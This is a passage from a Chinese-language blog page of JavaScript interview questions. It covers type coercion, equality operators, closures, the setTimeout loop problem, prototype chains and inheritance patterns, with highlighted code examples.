href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/isPrototypeOf">Object.prototype.isPrototypeOf()</a>可以一句话判断。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">String</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-title function_">isPrototypeOf</span>(<span class="hljs-string">&quot;123&quot;</span>)   <span class="hljs-comment">//false</span><br><span class="hljs-title class_">String</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-title function_">isPrototypeOf</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;123&quot;</span>))   <span class="hljs-comment">//true</span><br><span class="hljs-title class_">String</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-title function_">isPrototypeOf</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Number</span>(<span class="hljs-number">123</span>))   <span class="hljs-comment">//false</span><br></code></pre></td></tr></table></figure><p>值得注意的是，必须要在某个类的<code>prototype</code>里调用这个函数，如果直接在类上调用是不行的。会全部返回false</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">String</span>.<span class="hljs-title function_">isPrototypeOf</span>(<span class="hljs-number">123</span>) <span class="hljs-comment">//fasle</span><br><span class="hljs-title class_">String</span>.<span class="hljs-title function_">isPrototypeOf</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;123&quot;</span>)) <span class="hljs-comment">//false</span><br><span class="hljs-title class_">String</span>.<span class="hljs-title function_">isPrototypeOf</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Number</span>(<span class="hljs-number">123</span>)) <span class="hljs-comment">//false</span><br></code></pre></td></tr></table></figure><h2 id="12-objectis和的区别"><a class="markdownIt-Anchor" href="#12-objectis和的区别"></a> 12. Object.is和===的区别？</h2><p>Object在严格相等的基础上修复了一些特殊情况下的失误，具体来说就是 <code>+0</code> 与 <code>-0</code>，<code>NaN</code> 与 <code>NaN</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">+<span class="hljs-number">0</span> === -<span class="hljs-number">0</span> <span class="hljs-comment">//true</span><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">is</span>(+<span class="hljs-number">0</span>, -<span class="hljs-number">0</span>) <span class="hljs-comment">//false</span><br><span class="hljs-title class_">NaN</span> === <span class="hljs-title class_">NaN</span> <span class="hljs-comment">//fasle</span><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">is</span>(<span class="hljs-title class_">NaN</span>, <span class="hljs-title class_">NaN</span>) <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><h2 id="13-结果是什么为什么"><a class="markdownIt-Anchor" href="#13-结果是什么为什么"></a> 13. [] == ![]结果是什么？为什么？</h2><p>根据<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Equality">MDN</a> 当两操作数类型不同时会试图转化为同一个类型，具体规则如下。</p><ol><li><p>当数字与字符串进行比较时，会尝试将字符串转换为数字值。</p></li><li><p>如果操作数之一是Boolean值，则将布尔操作数转化为0 / 1【false转0，true转1】</p></li><li><p>如果操作数之一是对象，另一个是数字或者字符串，会尝试调用对象的valueOf() 和 toString()方法将对象转化为原始值。</p></li></ol><p>所以这里我们就可以知道<code>[] == ![]</code>的过程了。</p><ul><li><p><code>[] == ![]</code></p><blockquote><p>首先判断两边，右侧有一个取非运算符，由于<code>[]</code>对应的布尔值为true，则<code>![]</code>对应false。</p></blockquote></li><li><p><code>[] == false</code></p><blockquote><p>对应之前说的第<strong>2</strong>种情况，即有一个操作数是布尔值，我们将布尔值转化为0。</p></blockquote></li><li><p><code>[] == 0</code></p><blockquote><p>现在对应第<strong>3</strong>种情况，操作之一是对象，另一个是数字，则调用valueOf把对象转化为数字。</p><p>值得注意的是 [].valueOf() 的返回值貌似还是一个数组。但是Number([]) = 0</p></blockquote></li><li><p><code>0 == 0</code></p><blockquote><p>true</p></blockquote></li></ul><h2 id="14-js中类型转换有哪几种"><a class="markdownIt-Anchor" href="#14-js中类型转换有哪几种"></a> 14. JS中类型转换有哪几种？</h2><ol><li><p>转化为字符。</p><blockquote><p>可以使用String()转型函数或者.toString()方法</p></blockquote> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">String</span>(<span class="hljs-number">5</span>) <span class="hljs-comment">//&#x27;5&#x27;</span><br><span class="hljs-number">5.</span>.<span class="hljs-title function_">toString</span>() <span class="hljs-comment">//&#x27;5&#x27;</span><br><span class="hljs-title class_">String</span>(<span class="hljs-literal">false</span>) <span class="hljs-comment">//&#x27;false&#x27;</span><br><span class="hljs-title class_">String</span>(<span class="hljs-literal">true</span>) <span class="hljs-comment">//&#x27;true&#x27;</span><br><span class="hljs-title class_">String</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-property">abs</span>) <span class="hljs-comment">//&#x27;function abs() &#123; [native code] &#125;&#x27;</span><br><span class="hljs-title class_">String</span>(<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">iterator</span>) <span class="hljs-comment">//&#x27;Symbol(Symbol.iterator)&#x27;</span><br><span class="hljs-title class_">String</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]) <span class="hljs-comment">//&#x27;1, 2, 3&#x27;</span><br><span class="hljs-title class_">String</span>(&#123;<span class="hljs-string">&quot;wuuconix&quot;</span>: <span class="hljs-string">&quot;yyds&quot;</span>&#125;) <span class="hljs-comment">//&#x27;[object Object]&#x27;</span><br><span class="hljs-title class_">String</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>()) <span class="hljs-comment">//&#x27;[object Map]&#x27;</span><br><span class="hljs-title class_">String</span>(<span class="hljs-number">123n</span>) <span class="hljs-comment">//&#x27;123&#x27;</span><br><span class="hljs-title class_">String</span>(<span class="hljs-literal">null</span>) <span class="hljs-comment">//&#x27;null&#x27;</span><br><span class="hljs-title class_">String</span>(<span class="hljs-literal">undefined</span>) <span class="hljs-comment">//&#x27;undefined&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>转化为数字。</p><blockquote><p>可以使用Number()转型函数 / parseInt() / parseFloat()</p></blockquote> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">Number</span>(<span class="hljs-number">1</span>) <span class="hljs-comment">//1</span><br><span class="hljs-title class_">Number</span>(<span class="hljs-literal">true</span>) <span class="hljs-comment">//1</span><br><span class="hljs-title class_">Number</span>(<span class="hljs-literal">false</span>) <span class="hljs-comment">//0</span><br><span class="hljs-title class_">Number</span>(<span class="hljs-string">&quot;1&quot;</span>) <span class="hljs-comment">//1</span><br><span class="hljs-title class_">Number</span>(<span class="hljs-literal">null</span>) <span class="hljs-comment">//0</span><br><span class="hljs-title class_">Number</span>(<span class="hljs-literal">undefined</span>) <span class="hljs-comment">//NaN</span><br><span class="hljs-title class_">Number</span>(<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">iterator</span>) <span class="hljs-comment">//Uncaught TypeError: Cannot convert a Symbol value to a number</span><br><span class="hljs-title class_">Number</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>]) <span class="hljs-comment">//NaN</span><br><span class="hljs-title class_">Number</span>(&#123;<span class="hljs-string">&quot;wuuconix&quot;</span>: <span class="hljs-string">&quot;yyds&quot;</span>&#125;) <span class="hljs-comment">//NaN</span><br><span class="hljs-title class_">Number</span>(<span class="hljs-number">123n</span>) <span class="hljs-comment">//123</span><br><span class="hljs-title class_">Number</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-property">abs</span>) <span class="hljs-comment">//NaN</span><br></code></pre></td></tr></table></figure></li><li><p>转化为布尔值</p><blockquote><p>可以使用Boolean()转型函数 还可以使用!!转型</p></blockquote> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">Boolean</span>(<span class="hljs-number">0</span>) <span class="hljs-comment">//false</span><br><span class="hljs-title class_">Boolean</span>(-<span class="hljs-number">0</span>) <span class="hljs-comment">//false</span><br><span class="hljs-title class_">Boolean</span>(<span class="hljs-title class_">NaN</span>) <span class="hljs-comment">//false</span><br><span class="hljs-title class_">Boolean</span>(<span class="hljs-string">&quot;&quot;</span>) <span class="hljs-comment">//false</span><br><span class="hljs-title class_">Boolean</span>(<span class="hljs-literal">null</span>) <span class="hljs-comment">//false</span><br><span class="hljs-title class_">Boolean</span>(<span class="hljs-literal">undefined</span>) <span class="hljs-comment">//false</span><br><span class="hljs-title class_">Boolean</span>([]) <span class="hljs-comment">//true</span><br><span class="hljs-title class_">Boolean</span>(&#123;&#125;) <span class="hljs-comment">//true</span><br><span class="hljs-title class_">Boolean</span>(<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">iterator</span>) <span class="hljs-comment">//true</span><br><span class="hljs-title class_">Boolean</span>(<span class="hljs-number">0n</span>) <span class="hljs-comment">//false</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="15-和-有什么区别"><a class="markdownIt-Anchor" href="#15-和-有什么区别"></a> 15. == 和 ===有什么区别？</h2><p>全等运算符 === 与相等运算符 == 最显著的区别是，如果操作数的类型不同，== 运算符会在比较之前尝试将它们转换为相同的类型。</p><p>而全等运算符 === 如果两个操作数的类型不同将直接返回false，不会进行类型转化。</p><p>== 在两个操作数类型不同时的转化规则如下。</p><p>如果两个操作数是不同类型的，就会尝试在比较之前将它们转换为相同类型：</p><ul><li><p>当数字与字符串进行比较时，会尝试将字符串转换为数字值。</p></li><li><p>如果操作数之一是Boolean，则将布尔操作数转换为1或0。</p></li><li><p>如果操作数之一是对象，另一个是数字或字符串，会尝试使用对象的valueOf()和toString()方法将对象转换为原始值。</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<span class="hljs-attr">a</span>: <span class="hljs-number">1</span>&#125; == <span class="hljs-literal">true</span> <span class="hljs-comment">//false  右侧true先转化为1，然后左侧对象转化为NaN</span><br>&#123;<span class="hljs-attr">a</span>: <span class="hljs-number">1</span>&#125; == <span class="hljs-string">&quot;[object Object]&quot;</span> <span class="hljs-comment">//true 右侧是字符串，所以左侧对象会转化为字符串</span><br></code></pre></td></tr></table></figure><h2 id="16-对象转原始类型是根据什么流程运行的"><a class="markdownIt-Anchor" href="#16-对象转原始类型是根据什么流程运行的"></a> 16. 对象转原始类型是根据什么流程运行的？</h2><ol><li><p>如果有Symbol.toPrimitive() 对象，优先调用返回</p></li><li><p>调用valueOf() 如果转化为原始类型，则返回</p></li><li><p>调用toString() 如果转化为原始类型，则返回</p></li><li><p>如果都没有返回原始类型，会报错</p></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> obj = &#123;<br>    <span class="hljs-attr">value</span>: <span class="hljs-number">3</span>,<br>    <span class="hljs-title function_">valueOf</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">4</span>;<br>    &#125;,<br>    <span class="hljs-title function_">toString</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;5&#x27;</span><br>    &#125;,<br>    [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">toPrimitive</span>]() &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">6</span><br>    &#125;<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj + <span class="hljs-number">1</span>); <span class="hljs-comment">// 输出7</span><br></code></pre></td></tr></table></figure><h2 id="17-如何让ifa-1-a-2条件成立"><a class="markdownIt-Anchor" href="#17-如何让ifa-1-a-2条件成立"></a> 17. 如何让if(a == 1 &amp;&amp; a == 2)条件成立？</h2><p>首先把a定义为一个对象，当一个对象和一个数字相比较的时候，会调用内部的valueOf方法，我们需要改变这个方法，让每次调用后的值 加 1</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> a = &#123;<br>    <span class="hljs-attr">value</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-title function_">valueOf</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span>++;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span>;<br>    &#125;<br>&#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a == <span class="hljs-number">1</span> &amp;&amp; a == <span class="hljs-number">2</span>);  <span class="hljs-comment">//true</span><br></code></pre></td></tr></table></figure><h2 id="18-什么是闭包"><a class="markdownIt-Anchor" href="#18-什么是闭包"></a> 18. 什么是闭包？</h2><p>一个函数对其周围状态（词法环境 <code>lexical environment</code>）的引用捆绑在一起，这样的组合就是闭包 <code>closure</code>。闭包可以让你在一个内层函数种访问到其外层函数的作用域。在JavaScript中，每创建一个函数，闭包就会在函数创建的同时被创建出来。</p><h2 id="19-闭包产生的原因"><a class="markdownIt-Anchor" href="#19-闭包产生的原因"></a> 19. 闭包产生的原因?</h2><p>闭包产生的本质就是，当前环境中存在指向父级作用域的引用。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">f1</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">let</span> a = <span class="hljs-number">2</span><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">f2</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a); <span class="hljs-comment">//2</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> f2;<br>&#125;<br><span class="hljs-keyword">let</span> x = <span class="hljs-title function_">f1</span>();<br><span class="hljs-title function_">x</span>();<br></code></pre></td></tr></table></figure><p>这里f2引用了父作用域中的a变量，f2和a的组合就是一个闭包。我们可以看到<code>f1</code>把<code>f2</code>以返回值的返回了。但是反不返回函数这不是闭包的本质特点，f2和a的组合就是闭包，而不用管是否将f2返回。我们返回的目的是在外部使用这个闭包。</p><p>实际上利用全局变量的方式也可以实现使用闭包。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> f3<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">f1</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">let</span> a = <span class="hljs-number">2</span><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">f2</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a); <span class="hljs-comment">//2</span><br>    &#125;<br>    f3 = f2<br>&#125;<br><span class="hljs-title function_">f1</span>() <span class="hljs-comment">//调用f1函数后，才能让f3获得f2函数的引用</span><br><span class="hljs-title function_">f3</span>() <span class="hljs-comment">//使用闭包</span><br></code></pre></td></tr></table></figure><h2 id="20-闭包有哪些表现形式"><a class="markdownIt-Anchor" href="#20-闭包有哪些表现形式"></a> 20. 闭包有哪些表现形式?</h2><p>在真实的场景中，究竟在哪些地方能体现闭包的存在？</p><ol><li><p>返回一个函数。见<a href="#19-闭包产生的原因" class="tocbot-link node-name--H2 ">19. 闭包产生的原因?</a></p></li><li><p>作为函数参数传递</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> a = <span class="hljs-number">1</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">let</span> a = <span class="hljs-number">2</span><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">baz</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a)<br>    &#125;<br>    <span class="hljs-title function_">bar</span>(baz);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">bar</span>(<span class="hljs-params">fn</span>) &#123;<br>    <span class="hljs-title function_">fn</span>();<br>&#125;<br><br><span class="hljs-title function_">foo</span>();<br></code></pre></td></tr></table></figure></li><li><p>在定时器、事件监听、Ajax请求、跨窗口通信、Web Workers或者任何异步中，只要使用了回调函<br />数，实际上就是在使用闭包。</p></li><li><p>IIFE <code>Immediate Invoked Function Expression</code> 立即执行函数表达式也算创建闭包，因为它保存了全局作用域和当前的函数作用域，可以使用全局的变量</p><blockquote><p>实际上是个函数就能使用全局作用域，所以我认为每个函数都是闭包的表现形式。</p></blockquote></li></ol><h2 id="21-如何解决下面的循环输出问题"><a class="markdownIt-Anchor" href="#21-如何解决下面的循环输出问题"></a> 21. 如何解决下面的循环输出问题？</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">5</span>; i ++)&#123;<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span> <span class="hljs-title function_">timer</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i)<br>    &#125;, <span class="hljs-number">0</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>会全部输出6。由于JS单线程eventLoop机制，每次调用setTimeout函数都会把这个任务加入消息队列，而且不会立刻执行，而是等主线程的for循环结束后才开始执行。由于执行输出i的时候会顺着作用域链到达全局作用域，而这时因为i已经变成6退出了循环，所以之后所有的回调都会输出6。</p><p>解决方法：</p><ol><li><p>使用let</p></li><li><p>使用IIFE</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">1</span>;i &lt;= <span class="hljs-number">5</span>;i++)&#123;<br>    (<span class="hljs-keyword">function</span>(<span class="hljs-params">j</span>)&#123;<br>        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span> <span class="hljs-title function_">timer</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(j)<br>        &#125;, <span class="hljs-number">0</span>)<br>    &#125;)(i)<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>给定时器传入第三个参数, 作为timer函数的第一个函数参数</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">1</span>;i &lt;= <span class="hljs-number">5</span>; i++)&#123;<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span> <span class="hljs-title function_">timer</span>(<span class="hljs-params">j</span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(j)<br>    &#125;, <span class="hljs-number">0</span>, i)<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>setTimeout的第一个一般都是一个函数，第二个参数是延时，第三个参数即以后如果有的话，就是传给第一个函数的参数们。</p></blockquote></li></ol><p>2和3的解决思路都是一致的，不用i，而在循环的过程中把i的值赋给一个变量传递给计时器，让回调时用这个变量。</p><h2 id="22-原型对象和构造函数有何关系"><a class="markdownIt-Anchor" href="#22-原型对象和构造函数有何关系"></a> 22. 原型对象和构造函数有何关系？</h2><p>在JavaScript中，每当定义一个函数数据类型(普通函数、类)时候，都会天生自带一个<code>prototype</code>属性，<br />这个属性指向函数的原型对象。</p><p>当函数被new调用，这个函数就成为了构造函数，返回一个全新的实例对象，这个实例对象有一个<code>__proto__</code>属性，指向构造函数的原型对象。</p><pre><code class=" mermaid">graph LR1([实例对象])2&#123;构造函数&#125;3(原型对象)1--&quot;__proto__属性&quot;--&gt;32--&quot;new&quot;--&gt;12--&quot;prototype属性&quot;--&gt;3</code></pre><h2 id="23-能不能描述一下原型链"><a class="markdownIt-Anchor" href="#23-能不能描述一下原型链"></a> 23. 能不能描述一下原型链？</h2><p>JS中的一个实例对象可以通过<code>__proto__</code>指向自己的原型对象。然后这个原型对象还可以继续通过<code>__proto__</code>来访问到父级的原型对象，直到访问到<code>Object</code>的原型对象，然后Obejct原型对象的<code>__proto__</code>就指向null了。</p><pre><code class=" mermaid">graph LR1([实例对象])2&#123;构造函数&#125;3(原型对象)4(父级原型对象)5(Object.prototype)6(null)1--&quot;__proto__属性&quot;--&gt;32--&quot;new&quot;--&gt;12--&quot;prototype属性&quot;--&gt;33--&quot;__proto__属性&quot;--&gt;44--&quot;...&quot;--&gt;55--&quot;__proto__属性&quot;--&gt;6</code></pre><ul><li>对象的<code>hasOwnProperty()</code>来检查对象自身是否含有某个属性</li><li>使用in检查对象是否有某个属性，如果对象中没有，但是原型链中有，也会返回true</li></ul><h2 id="24-js如何实现继承"><a class="markdownIt-Anchor" href="#24-js如何实现继承"></a> 24. JS如何实现继承？</h2><blockquote><p>以下分类基于红宝书</p></blockquote><ol><li><p>借助原型链继承</p><p>它的核心特征是把子类的原型设置为父类的一个实例。这样能够同时或者父类的实例方法与原型方法。</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">SuperType</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = <span class="hljs-string">&quot;super&quot;</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">lan</span> = [<span class="hljs-string">&quot;html&quot;</span>, <span class="hljs-string">&quot;css&quot;</span>, <span class="hljs-string">&quot;js&quot;</span>]<br>&#125;<br><span class="hljs-title class_">SuperType</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHi</span> = <span class="hljs-keyword">function</span> <span class="hljs-title function_">sayHi</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, I&#x27;m <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>)<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">SubType</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = <span class="hljs-string">&quot;sub&quot;</span><br>&#125;<br><br><span class="hljs-title class_">SubType</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SuperType</span>() <span class="hljs-comment">//核心特征</span><br><span class="hljs-keyword">let</span> instance1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SubType</span>()<br><span class="hljs-keyword">let</span> instance2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SubType</span>()<br>instance1.<span class="hljs-title function_">sayHi</span>() <span class="hljs-comment">//Hi, I&#x27;m sub 可以使用父类原型上的方法</span><br><br>instance1.<span class="hljs-property">lan</span>.<span class="hljs-title function_">push</span>(<span class="hljs-string">&quot;vue&quot;</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(instance2.<span class="hljs-property">lan</span>) <span class="hljs-comment">//[ &#x27;html&#x27;, &#x27;css&#x27;, &#x27;js&#x27;, &#x27;vue&#x27; ]</span><br></code></pre></td></tr></table></figure><p>它看起来非常好，能够顺畅地得到父类地所有属性和方法，但是实际上有问题。</p><p>由于子类地原型是父类地一个实例，所以父类地实例属性变成了子类地原型属性。所以子类的实例会共享这些属性，一个子类实例去改变了原型属性后，其他的子类也会收到影响。</p><p>此外，它还有一个问题是无法给子类的构造参数传参，或者说根据子类的实例个性化的传参，因为子类调用父类构造函数的时候就是<code>SubType.prototype = new SuperType()</code>这一处，而这里是对于整个子类而言的一次性操作，无法根据每个子类实例特定化地向父类构造函数传参。</p></li><li><p>盗用构造函数</p><p>其核心特征就是在子类地构造函数中利用<code>call</code>来调用父类的构造函数，从而简化代码，让子类也有这些属性。</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">SuperType</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name ?? <span class="hljs-string">&quot;super&quot;</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">lan</span> = [<span class="hljs-string">&quot;html&quot;</span>, <span class="hljs-string">&quot;css&quot;</span>, <span class="hljs-string">&quot;js&quot;</span>]<br>&#125;<br><span class="hljs-title class_">SuperType</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHi</span> = <span class="hljs-keyword">function</span> <span class="hljs-title function_">sayHi</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, I&#x27;m <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>)<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">SubType</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-title class_">SuperType</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, name) <span class="hljs-comment">//核心特征</span><br>&#125;<br><br><span class="hljs-keyword">let</span> instance1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SubType</span>(<span class="hljs-string">&quot;instance1&quot;</span>)<br><span class="hljs-keyword">let</span> instance2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SubType</span>(<span class="hljs-string">&quot;instance2&quot;</span>)<br>instance1.<span class="hljs-property">lan</span>.<span class="hljs-title function_">push</span>(<span class="hljs-string">&quot;vue&quot;</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(instance2.<span 